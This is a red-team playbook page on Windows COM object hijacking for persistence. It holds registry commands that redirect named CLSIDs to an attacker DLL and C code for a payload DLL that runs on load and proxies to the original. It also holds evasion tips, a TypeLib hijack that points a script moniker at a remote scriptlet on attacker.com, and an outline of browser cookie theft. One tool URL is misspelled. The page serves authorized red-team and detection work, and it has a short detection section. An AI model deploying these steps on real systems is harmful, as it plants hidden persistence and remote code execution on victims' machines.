# COM Object Hijacking

> **MITRE ATT&CK**: Persistence / Privilege Escalation > T1546.015 - Event Triggered Execution: COM Hijacking
> **Platforms**: Windows
> **Required Privileges**: User (HKCU hijacking), Admin (HKLM)
> **OPSEC Risk**: Low-Medium (executes via legitimate software, no new processes created)

---

## Strategic Overview

COM (Component Object Model) hijacking is one of the stealthiest persistence mechanisms available on Windows. It works by exploiting the Windows COM resolution order: when a program instantiates a COM object, Windows checks HKCU registry entries before HKLM. By placing a malicious DLL reference in HKCU for a COM object that is legitimately registered in HKLM, the attacker's DLL loads whenever any application instantiates that COM object. The key advantage is that no new processes, services, or scheduled tasks are created -- the malicious code executes within an existing legitimate process. For a Red Team Lead, COM hijacking represents the gold standard for user-level persistence when stealth is the priority. The main challenge is identifying suitable CLSIDs that are frequently instantiated by common applications.

## Technical Deep-Dive

### COM Architecture Basics

```
COM Resolution Order:
1. HKCU\Software\Classes\CLSID\{GUID}\InprocServer32  (per-user, checked first)
2. HKCR\CLSID\{GUID}\InprocServer32                    (merged view)
3. HKLM\Software\Classes\CLSID\{GUID}\InprocServer32  (machine-wide)

Key Registry Values:
- InprocServer32: Path to DLL loaded in-process
- LocalServer32:  Path to out-of-process EXE server
- (Default):      DLL/EXE path
- ThreadingModel: "Apartment", "Free", "Both", "Neutral"

Hijack Strategy:
- Find CLSIDs registered in HKLM but NOT in HKCU
- Create HKCU entry pointing to malicious DLL
- Windows loads attacker DLL instead of legitimate one
```

### Finding Hijackable CLSIDs

```powershell
# Method 1: Compare HKCU vs HKLM CLSID registrations
# Find CLSIDs in HKLM that can be hijacked via HKCU
$hklmCLSIDs = Get-ChildItem "HKLM:\Software\Classes\CLSID" | Select -ExpandProperty PSChildName
$hkcuCLSIDs = Get-ChildItem "HKCU:\Software\Classes\CLSID" -ErrorAction SilentlyContinue | Select -ExpandProperty PSChildName
$hijackable = $hklmCLSIDs | Where-Object { $_ -notin $hkcuCLSIDs }

# Method 2: Use Process Monitor (Sysinternals)
# Filter: Operation=RegOpenKey, Result=NAME NOT FOUND, Path contains InprocServer32
# This shows COM objects that applications try to load from HKCU but fail
# These are prime hijack candidates

# Method 3: OleViewDotNet (James Forshaw)
# Comprehensive COM enumeration and analysis tool
# Identify non-existent HKCU registrations for frequently-used CLSIDs
```

### Common Hijack Targets

```powershell
# Frequently instantiated CLSIDs that make good hijack targets:

# 1. Scheduled Task Handler (explorer.exe loads this)
# CLSID: {0F87369F-A4E5-4CFC-BD3E-73E6154572DD}
# Trigger: Explorer startup, task tray operations

# 2. Shell Extension (loaded by explorer.exe on startup)
# CLSID: {AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}
# Trigger: Explorer shell initialization

# 3. MSCTF (Text Services Framework - loaded by most GUI apps)
# CLSID: {06622D85-6856-4460-8DE1-A81921B41C4B}
# Trigger: Any GUI application that uses text input

# 4. MMDeviceEnumerator (audio subsystem)
# CLSID: {BCDE0395-E52F-467C-8E3D-C4579291692E}
# Trigger: Any application that accesses audio

# Enumerate what loads a specific CLSID
Get-ItemProperty "HKLM:\Software\Classes\CLSID\{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}\InprocServer32"
```

### Executing the Hijack

```bash
# Step 1: Create HKCU CLSID entry pointing to malicious DLL
reg add "HKCU\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" /ve /t REG_SZ /d "C:\Users\Public\legit_helper.dll" /f
reg add "HKCU\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Both" /f

# Step 2: Payload DLL is loaded next time the COM object is instantiated
# No need to restart - many COM objects are loaded on-demand
```

```powershell
# PowerShell - more controlled hijack setup
$clsid = "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
$regPath = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
New-Item -Path $regPath -Force
Set-ItemProperty -Path $regPath -Name "(Default)" -Value "C:\Users\Public\helper.dll"
Set-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Both"
```

### DLL Payload Requirements

```c
// COM hijack DLL must export DllGetClassObject, DllCanUnloadNow, etc.
// Minimal COM DLL that executes payload on load:

#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Execute payload in new thread to avoid blocking COM initialization
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PayloadFunction, NULL, 0, NULL);
    }
    return TRUE;
}

// Required COM exports (can be stubs)
HRESULT __stdcall DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID *ppv) {
    // Optionally proxy to original DLL to maintain functionality
    return CLASS_E_CLASSNOTAVAILABLE;
}

HRESULT __stdcall DllCanUnloadNow(void) {
    return S_FALSE;  // Keep loaded
}

HRESULT __stdcall DllRegisterServer(void) { return S_OK; }
HRESULT __stdcall DllUnregisterServer(void) { return S_OK; }
```

### Proxying to Original DLL

```c
// To maintain stealth, proxy COM calls to the original DLL
// This prevents application errors that would alert the user

// Load original DLL and forward calls
HMODULE hOriginal = NULL;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Load the original COM DLL
        hOriginal = LoadLibrary("C:\\Windows\\System32\\original.dll");
        // Execute payload
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Payload, NULL, 0, NULL);
    }
    return TRUE;
}

HRESULT __stdcall DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID *ppv) {
    // Forward to original DLL
    typedef HRESULT(__stdcall *pDllGetClassObject)(REFCLSID, REFIID, LPVOID*);
    pDllGetClassObject original = (pDllGetClassObject)GetProcAddress(hOriginal, "DllGetClassObject");
    return original(rclsid, riid, ppv);
}
```

### OleViewDotNet Enumeration

```powershell
# OleViewDotNet - comprehensive COM analysis
# https://github.com/tyranid/oleern-dotnet

# Enumerate all COM objects with missing HKCU registrations
# Filter for objects loaded by common processes (explorer, svchost)
# Identify CLSIDs with high instantiation frequency

# Command-line usage
OleViewDotNet.exe -e  # Enumerate all COM objects
```

## Detection & Evasion

### Detection Mechanisms
- **Sysmon Event ID 12-14**: Registry modification in CLSID paths
- **Autoruns**: Checks some COM hijack locations
- **Process loaded module analysis**: Unusual DLLs loaded in legitimate processes
- **Registry comparison**: Baseline HKCU CLSID entries vs current state

### Evasion Techniques
- Proxy COM calls to the original DLL to prevent application errors
- Use CLSIDs that are not commonly monitored by security tools
- Place the DLL in a path that appears legitimate (C:\Program Files\...)
- Sign the DLL with a code signing certificate if available
- Choose COM objects loaded by processes that already load many third-party DLLs
- Use ThreadingModel matching the original COM object registration

### OPSEC Considerations
- COM hijacking is one of the stealthiest persistence techniques available
- No new processes, services, or scheduled tasks are created
- The malicious DLL executes within the context of a legitimate process
- If the DLL crashes the host process, it creates visible user impact
- Always test the hijack DLL to ensure it does not break application functionality
- Cleanup: simply delete the HKCU registry key

---

## 2025 Techniques

### TypeLib COM Hijacking -- Script Moniker Redirection

Hijacks Windows Type Library (TypeLib) registry entries by replacing library paths with
`script:` monikers pointing to remote scriptlets. First observed in the wild March 2025
(CICADA8 research by Michael Zhmailo, October 2024).

```
# How TypeLib hijacking works:
# 1. When a COM server loads its TypeLib (e.g., explorer.exe at startup),
#    Windows checks the registry for the TypeLib path
# 2. Replace the path with a script: moniker pointing to a remote scriptlet
#    HKCU\Software\Classes\TypeLib\{GUID}\1.0\0\win32
#    Original: C:\Windows\System32\something.tlb
#    Hijacked: script:http://attacker.com/payload.sct
# 3. Windows executes the remote scriptlet instead of loading the TypeLib
# Result: Fileless persistence via remote script execution

# TypeLibWalker tool automates discovery of vulnerable entries
# github.com/CICADA8-Research/TypeLibWalker

# First in-the-wild exploitation: March 2025
# Validates operational viability beyond theoretical research
```

### COM Hijacking for Browser Credential Theft

SpecterOps (May 2025) demonstrated COM hijacking to load callbacks into Chrome/Edge processes,
targeting Chromium app-bound encryption (introduced Chrome 127) to decrypt cookies without
SYSTEM privileges.

```
# Attack flow:
# 1. Identify COM object loaded by Chrome/Edge at startup
# 2. Register hijack DLL in HKCU for that CLSID
# 3. DLL loads directly into browser process
# 4. Gain access to decrypted cookies (bypasses app-bound encryption)
# No SYSTEM privileges needed -- the browser decrypts its own cookies
# SpecterOps: "Revisiting COM Hijacking" (May 2025)
```

---

## Cross-References

- [Registry Persistence](registry-persistence.md) -- Registry-based persistence alternatives
- **AV/EDR Evasion** (06-defense-evasion/av-edr-evasion.md) -- DLL proxying and sideloading techniques
- **Credential Stores** (07-credential-access/credential-stores.md) -- Browser credential theft via COM hijack
- **.NET Execution** (03-execution/dotnet-execution.md) -- .NET COM object abuse

## References

- MITRE T1546.015: https://attack.mitre.org/techniques/T1546/015/
- COM Hijacking research (Bohops): https://bohops.com/2018/08/18/abusing-the-com-registry-structure-clsid-localserver32-inprocserver32/
- OleViewDotNet: https://github.com/tyranid/oleview-dotnet
- Hijack Libs: https://hijacklibs.net/
- COM Object Hijacking (Elastic): https://www.elastic.co/blog/how-hunt-detect-com-hijacking
- CICADA8 TypeLib Hijacking: https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661
- TypeLibWalker: https://github.com/CICADA8-Research/TypeLibWalker
- SpecterOps COM Hijacking: https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/
